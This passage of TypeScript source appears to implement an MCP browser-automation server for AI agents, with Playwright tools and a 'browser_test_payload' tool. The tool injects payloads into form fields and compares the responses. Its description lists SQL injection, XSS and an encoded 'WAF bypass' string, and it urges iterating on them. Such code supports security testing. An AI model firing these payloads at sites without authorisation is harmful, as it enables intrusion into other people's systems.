━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ EXAMPLE USAGE

Test SQL injection:
{
  "targetSelector": "#username",
  "payload": "' OR 1=1--",
  "submitSelector": "#login"
}

Test XSS:
{
  "targetSelector": "input[name='comment']",
  "payload": "<script>alert(1)</script>"
}

Test with encoding (WAF bypass):
{
  "targetSelector": "#search",
  "payload": "%27%20OR%201=1--"
}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Remember: Test ONE payload at a time, analyze results, adapt your strategy, and iterate!`,
          inputSchema: {
            type: "object",
            properties: {
              targetSelector: {
                type: "string",
                description: "CSS selector of the input field to test (e.g., '#username', 'input[name=search]')"
              },
              payload: {
                type: "string",
                description: "The injection payload to test (e.g., \"' OR 1=1--\", \"<script>alert(1)</script>\")"
              },
              sessionId: {
                type: "string",
                default: "default",
                description: "Browser session ID"
              },
              submitSelector: {
                type: "string",
                description: "CSS selector of submit button (optional, for form submission)"
              },
              waitAfterSubmit: {
                type: "number",
                default: 2000,
                description: "Time to wait after submission in milliseconds"
              }
            },
            required: ["targetSelector", "payload"]
          }
        }
      ],
    }));

    this.server.setRequestHandler(CallToolRequestSchema, async (request) => {
      try {
        switch (request.params.name) {
          case "browser_navigate":
            return await this.navigate(request.params.arguments as Parameters<typeof this.navigate>[0]);
          case "browser_click":
            return await this.click(request.params.arguments as Parameters<typeof this.click>[0]);
          case "browser_type":
            return await this.type(request.params.arguments as Parameters<typeof this.type>[0]);
          case "browser_screenshot":
            return await this.screenshot(request.params.arguments as Parameters<typeof this.screenshot>[0]);
          case "browser_extract_text":
            return await this.extractText(request.params.arguments as Parameters<typeof this.extractText>[0]);
          case "browser_wait_for_element":
            return await this.waitForElement(request.params.arguments as Parameters<typeof this.waitForElement>[0]);
          case "browser_fill_form":
            return await this.fillForm(request.params.arguments as Parameters<typeof this.fillForm>[0]);
          case "browser_scroll":
            return await this.scroll(request.params.arguments as Parameters<typeof this.scroll>[0]);
          case "browser_get_page_info":
            return await this.getPageInfo(request.params.arguments as Parameters<typeof this.getPageInfo>[0]);
          case "browser_execute_script":
            return await this.executeScript(request.params.arguments as Parameters<typeof this.executeScript>[0]);
          case "browser_intercept_requests":
            return await this.interceptRequests(request.params.arguments as Parameters<typeof this.interceptRequests>[0]);
          case "browser_download_file":
            return await this.downloadFile(request.params.arguments as Parameters<typeof this.downloadFile>[0]);
          case "browser_mobile_emulate":
            return await this.mobileEmulate(request.params.arguments as Parameters<typeof this.mobileEmulate>[0]);
          case "browser_close_session":
            return await this.closeSession(request.params.arguments as Parameters<typeof this.closeSession>[0]);
          case "browser_create_pdf":
            return await this.createPDF(request.params.arguments as Parameters<typeof this.createPDF>[0]);
          case "browser_test_payload":
            return await this.testPayload(request.params.arguments as Parameters<typeof this.testPayload>[0]);
          default:
            throw new Error(`Unknown tool: ${request.params.name}`);
        }
      } catch (error) {
        return {
          content: [
            {
              type: "text",
              text: JSON.stringify({
                error: error instanceof Error ? error.message : "Unknown error",
                tool: request.params.name
              }, null, 2),
            },
          ],
          isError: true,
        };
      }
    });
  }

  private async getOrCreateSession(
    sessionId: string, 
    browserType: 'chromium' | 'firefox' | 'webkit' = 'chromium', 
    viewport?: { width: number; height: number }
  ): Promise<BrowserSession> {
    if (this.sessions.has(sessionId)) {
      return this.sessions.get(sessionId)!;
    }

    let browser: Browser;
    switch (browserType) {
      case 'firefox':
        browser = await firefox.launch({ headless: false });
        break;
      case 'webkit':
        browser = await webkit.launch({ headless: false });
        break;
      default:
        browser = await chromium.launch({ headless: false });
    }

    const context = await browser.newContext({
      viewport: viewport || { width: 1280, height: 720 }
    });
    
    const page = await context.newPage();

    const session: BrowserSession = {
      id: sessionId,
      browser,
      context,
      page,
      browserType
    };

    this.sessions.set(sessionId, session);
    return session;
  }

  private async navigate(args: { 
    url: string; 
    waitFor?: 'load' | 'domcontentloaded' | 'networkidle'; 
    sessionId?: string; 
    browser?: 'chromium' | 'firefox' | 'webkit'; 
    viewport?: { width: number; height: number } 
  }) {
    const { url, waitFor = 'load', sessionId = 'default', browser = 'chromium', viewport } = args;
    const session = await this.getOrCreateSession(sessionId, browser, viewport);
    
    await session.page.goto(url, { waitUntil: waitFor });
    
    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            url: session.page.url(),
            title: await session.page.title(),
            sessionId
          }, null, 2),
        },
      ],
    };
  }

  private async click(args: { 
    selector: string; 
    sessionId?: string; 
    waitFor?: number; 
    force?: boolean 
  }) {
    const { selector, sessionId = 'default', waitFor = 1000, force = false } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    await session.page.click(selector, { force });
    if (waitFor > 0) {
      await session.page.waitForTimeout(waitFor);
    }

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'click',
            selector
          }, null, 2),
        },
      ],
    };
  }

  private async type(args: { 
    selector: string; 
    text: string; 
    sessionId?: string; 
    clear?: boolean; 
    delay?: number 
  }) {
    const { selector, text, sessionId = 'default', clear = true, delay = 50 } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    if (clear) {
      await session.page.fill(selector, '');
    }
    await session.page.type(selector, text, { delay });

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'type',
            selector,
            text: text.substring(0, 100) + (text.length > 100 ? '...' : '')
          }, null, 2),
        },
      ],
    };
  }

  private async screenshot(args: { 
    path: string; 
    sessionId?: string; 
    selector?: string; 
    fullPage?: boolean; 
    quality?: number;
    type?: 'png' | 'jpeg'
  }) {
    const { path, sessionId = 'default', selector, fullPage = false, quality = 90, type } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    // Auto-detect type from file extension if not specified
    const fileType = type || (path.toLowerCase().endsWith('.jpg') || path.toLowerCase().endsWith('.jpeg') ? 'jpeg' : 'png');
    
    const options: any = { path, type: fileType };
    if (fullPage) options.fullPage = true;
    
    // Only add quality for JPEG
    if (fileType === 'jpeg' && quality) {
      options.quality = quality;
    }

    if (selector) {
      const element = session.page.locator(selector);
      await element.screenshot(options);
    } else {
      await session.page.screenshot(options);
    }

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'screenshot',
            path,
            type: fileType,
            fullPage,
            selector,
            quality: fileType === 'jpeg' ? quality : undefined
          }, null, 2),
        },
      ],
    };
  }

  private async extractText(args: { 
    selector: string; 
    sessionId?: string; 
    attribute?: string; 
    multiple?: boolean 
  }) {
    const { selector, sessionId = 'default', attribute, multiple = false } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    let result;
    if (multiple) {
      const elements = session.page.locator(selector);
      const count = await elements.count();
      result = [];
      for (let i = 0; i < count; i++) {
        const element = elements.nth(i);
        const value = attribute ? await element.getAttribute(attribute) : await element.textContent();
        result.push(value);
      }
    } else {
      const element = session.page.locator(selector);
      result = attribute ? await element.getAttribute(attribute) : await element.textContent();
    }

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'extract_text',
            selector,
            attribute,
            result
          }, null, 2),
        },
      ],
    };
  }

  private async waitForElement(args: { 
    selector: string; 
    sessionId?: string; 
    timeout?: number; 
    state?: 'visible' | 'hidden' | 'attached' | 'detached' 
  }) {
    const { selector, sessionId = 'default', timeout = 30000, state = 'visible' } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    await session.page.waitForSelector(selector, { timeout, state });

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'wait_for_element',
            selector,
            state,
            timeout
          }, null, 2),
        },
      ],
    };
  }

  private async fillForm(args: { 
    fields: Record<string, string>; 
    sessionId?: string; 
    submitSelector?: string; 
    waitAfterSubmit?: number 
  }) {
    const { fields, sessionId = 'default', submitSelector, waitAfterSubmit = 3000 } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    for (const [selector, value] of Object.entries(fields)) {
      await session.page.fill(selector, value as string);
    }

    if (submitSelector) {
      await session.page.click(submitSelector);
      if (waitAfterSubmit > 0) {
        await session.page.waitForTimeout(waitAfterSubmit);
      }
    }

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'fill_form',
            fieldsCount: Object.keys(fields).length,
            submitted: !!submitSelector
          }, null, 2),
        },
      ],
    };
  }

  private async scroll(args: { 
    direction?: 'up' | 'down' | 'left' | 'right' | 'top' | 'bottom'; 
    pixels?: number; 
    sessionId?: string; 
    selector?: string 
  }) {
    const { direction = 'down', pixels = 500, sessionId = 'default', selector } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    let scrollFunction;
    switch (direction) {
      case 'up':
        scrollFunction = `window.scrollBy(0, -${pixels})`;
        break;
      case 'down':
        scrollFunction = `window.scrollBy(0, ${pixels})`;
        break;
      case 'left':
        scrollFunction = `window.scrollBy(-${pixels}, 0)`;
        break;
      case 'right':
        scrollFunction = `window.scrollBy(${pixels}, 0)`;
        break;
      case 'top':
        scrollFunction = `window.scrollTo(0, 0)`;
        break;
      case 'bottom':
        scrollFunction = `window.scrollTo(0, document.body.scrollHeight)`;
        break;
    }

    if (selector) {
      await session.page.locator(selector).evaluate((el, script) => {
        eval(script.replace('window.', 'el.'));
      }, scrollFunction);
    } else {
      await session.page.evaluate(scrollFunction);
    }

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'scroll',
            direction,
            pixels
          }, null, 2),
        },
      ],
    };
  }

  private async getPageInfo(args: { 
    sessionId?: string; 
    includeMetrics?: boolean 
  }) {
    const { sessionId = 'default', includeMetrics = false } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    const info: any = {
      url: session.page.url(),
      title: await session.page.title(),
      viewport: session.page.viewportSize()
    };

    if (includeMetrics) {
      const metrics = await session.page.evaluate(() => ({
        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
        domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
        domElements: document.querySelectorAll('*').length
      }));
      info.metrics = metrics;
    }

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            info
          }, null, 2),
        },
      ],
    };
  }

  private async executeScript(args: { 
    script: string; 
    sessionId?: string; 
    args?: unknown[] 
  }) {
    const { script, sessionId = 'default', args: scriptArgs = [] } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    const result = await session.page.evaluate(
      ({ script, args }: { script: string; args: unknown[] }) => {
        const func = new Function('...args', script);
        return func(...args);
      },
      { script, args: scriptArgs }
    );

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            result
          }, null, 2),
        },
      ],
    };
  }

  private async interceptRequests(args: { 
    urlPattern?: string; 
    sessionId?: string; 
    mockResponse?: { status?: number; body?: unknown; headers?: Record<string, string> } 
  }) {
    const { urlPattern = '**', sessionId = 'default', mockResponse } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    await session.page.route(urlPattern, (route) => {
      if (mockResponse) {
        route.fulfill({
          status: mockResponse.status || 200,
          body: JSON.stringify(mockResponse.body),
          headers: mockResponse.headers || {}
        });
      } else {
        console.log(`Intercepted: ${route.request().method()} ${route.request().url()}`);
        route.continue();
      }
    });

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'intercept_requests',
            pattern: urlPattern,
            hasMock: !!mockResponse
          }, null, 2),
        },
      ],
    };
  }

  private async downloadFile(args: { 
    triggerSelector: string; 
    downloadPath: string; 
    sessionId?: string; 
    timeout?: number 
  }) {
    const { triggerSelector, downloadPath, sessionId = 'default', timeout = 30000 } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    const [download] = await Promise.all([
      session.page.waitForEvent('download', { timeout }),
      session.page.click(triggerSelector)
    ]);

    const filePath = path.join(downloadPath, download.suggestedFilename());
    await download.saveAs(filePath);

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'download_file',
            filename: download.suggestedFilename(),
            path: filePath
          }, null, 2),
        },
      ],
    };
  }

  private async mobileEmulate(args: { 
    device: string; 
    sessionId?: string; 
    orientation?: 'portrait' | 'landscape' 
  }) {
    const { device, sessionId = 'default', orientation = 'portrait' } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    const devices = {
      'iPhone 12': { width: 390, height: 844, userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)' },
      'iPhone 13': { width: 390, height: 844, userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)' },
      'iPhone 14': { width: 390, height: 844, userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)' },
      'iPad': { width: 768, height: 1024, userAgent: 'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X)' },
      'Samsung Galaxy S21': { width: 360, height: 800, userAgent: 'Mozilla/5.0 (Linux; Android 11; SM-G991B)' },
      'Pixel 5': { width: 393, height: 851, userAgent: 'Mozilla/5.0 (Linux; Android 11; Pixel 5)' }
    };

    const deviceConfig = devices[device as keyof typeof devices];
    if (!deviceConfig) {
      throw new Error(`Unknown device: ${device}`);
    }

    const viewport = orientation === 'landscape' 
      ? { width: deviceConfig.height, height: deviceConfig.width }
      : { width: deviceConfig.width, height: deviceConfig.height };

    // Close the old context and page
    await session.page.close();
    await session.context.close();

    // Create a new context with the desired userAgent and viewport
    const newContext = await session.browser.newContext({
      viewport,
      userAgent: deviceConfig.userAgent
    });
    const newPage = await newContext.newPage();

    // Update the session
    session.context = newContext;
    session.page = newPage;

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'mobile_emulate',
            device,
            orientation,
            viewport
          }, null, 2),
        },
      ],
    };
  }

  private async createPDF(args: { 
    path: string; 
    sessionId?: string; 
    format?: string; 
    printBackground?: boolean; 
    margin?: { top?: string; bottom?: string; left?: string; right?: string } 
  }) {
    const { path, sessionId = 'default', format = 'A4', printBackground = true, margin } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    await session.page.pdf({
      path,
      format,
      printBackground,
      margin: margin || { top: '1cm', bottom: '1cm', left: '1cm', right: '1cm' }
    });

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'create_pdf',
            path,
            format
          }, null, 2),
        },
      ],
    };
  }

  private async testPayload(args: {
    targetSelector: string;
    payload: string;
    sessionId?: string;
    submitSelector?: string;
    waitAfterSubmit?: number;
  }) {
    const {
      targetSelector,
      payload,
      sessionId = 'default',
      submitSelector,
      waitAfterSubmit = 2000
    } = args;

    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    try {
      // Get baseline response (with safe test string)
      const baselineStart = Date.now();
      await session.page.fill(targetSelector, 'safetest123');

      if (submitSelector) {
        await session.page.click(submitSelector);
        await session.page.waitForTimeout(waitAfterSubmit);
      }

      const baselineBody = await session.page.content();
      const baselineTime = Date.now() - baselineStart;
      const baselineStatus = 200; // Playwright doesn't directly expose status after navigation

      // Test the payload
      const testStart = Date.now();
      await session.page.fill(targetSelector, '');
      await session.page.fill(targetSelector, payload);

      if (submitSelector) {
        await session.page.click(submitSelector);
        await session.page.waitForTimeout(waitAfterSubmit);
      }

      const testBody = await session.page.content();
      const testTime = Date.now() - testStart;
      const testStatus = 200;

      // Analyze the response
      const analysis = PayloadAnalyzer.analyze(
        { status: baselineStatus, body: baselineBody, time: baselineTime },
        { status: testStatus, body: testBody, time: testTime },
        payload
      );

      const result: PayloadTestResult = {
        success: true,
        payload,
        ...analysis
      };

      return {
        content: [
          {
            type: "text",
            text: JSON.stringify(result, null, 2),
          },
        ],
      };

    } catch (error) {
      return {
        content: [
          {
            type: "text",
            text: JSON.stringify({
              success: false,
              payload,
              error: error instanceof Error ? error.message : 'Unknown error',
              recommendation: '❌ Error executing payload. Check selector validity and page state.'
            }, null, 2),
          },
        ],
        isError: true,
      };
    }
  }

  private async closeSession(args: { sessionId?: string }) {
    const { sessionId = 'default' } = args;
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    await session.browser.close();
    this.sessions.delete(sessionId);

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify({
            success: true,
            action: 'close_session',
            sessionId
          }, null, 2),
        },
      ],
    };
  }

  private async cleanup() {
    for (const session of this.sessions.values()) {
      try {
        await session.browser.close();
      } catch (error) {
        console.error('Error closing browser:', error);
      }
    }
    this.sessions.clear();
  }

  async run() {
    const transport = new StdioServerTransport();
    await this.server.connect(transport);
    console.error("MCP Browser server running on stdio");
  }
}

const server = new MCPBrowserServer();
server.run().catch(console.error);